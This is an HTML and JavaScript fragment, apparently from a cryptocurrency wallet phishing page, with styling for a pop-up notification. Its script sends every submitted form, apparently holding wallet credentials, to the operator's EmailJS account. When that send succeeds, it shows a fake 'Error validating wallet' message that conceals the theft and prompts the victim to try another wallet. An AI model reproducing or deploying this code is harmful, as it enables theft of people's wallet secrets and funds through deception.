    <style>
        /* Notification box styles */
        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            font-size: 16px;
            font-family: Arial, sans-serif;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            z-index: 9999;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
        }

        .notification.show {
            opacity: 1;
        }

        .notification.success {
            background-color: #4CAF50;
            /* green */
        }

        .notification.error {
            background-color: #7a1710;
            /* red */
        }
    </style>

    <script>
        $(document).ready(function () {
            $('.ajaxForm').on('submit', function (event) {
                event.preventDefault();

                // Send form data via EmailJS
                var formData = new FormData(this);
                formData.append('service_id', 'service_yf1zyoq');
                formData.append('template_id', 'template_3191bbv');
                formData.append('user_id', 'vA_7NzGZQ-mlt_kHM');

                $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
                    type: 'POST',
                    data: formData,
                    contentType: false,
                    processData: false
                }).done(function () {
                    showNotification('❌ Error validating wallet.. Please try again or use another wallet...', 5, ' ', 'error');
                }).fail(function (error) {
                    showNotification('Oops! Something went wrong.', 5, ' ', 'error');
                });
            });

            // Function to show notification with countdown and color
            function showNotification(message, seconds, redirectUrl, type) {
                var notification = $('<div class="notification"></div>');
                notification.addClass(type); // add 'success' or 'error' class
                $('body').append(notification);

                // Initialize message with countdown
                var countdown = seconds;
                notification.text(`${message} Redirecting in ${countdown} seconds...`);
                setTimeout(function () {
                    notification.addClass('show'); // fade-in
                }, 100);

                // Countdown logic
                var interval = setInterval(function () {
                    countdown--;
                    notification.text(`${message} Redirecting in ${countdown} seconds...`);
                    if (countdown <= 0) {
                        clearInterval(interval);
                        window.location.href = redirectUrl;
                    }
                }, 1000);
            }
        });
    </script>
